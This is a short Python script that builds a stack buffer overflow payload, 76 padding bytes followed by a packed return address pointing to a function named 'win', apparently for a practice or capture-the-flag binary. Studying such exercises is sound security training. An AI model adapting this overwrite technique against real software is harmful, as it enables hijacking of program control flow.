#!/usr/bin/python
import struct
 
padding="A"*76
win=struct.pack("I",0x80483f4)
print (padding+win)
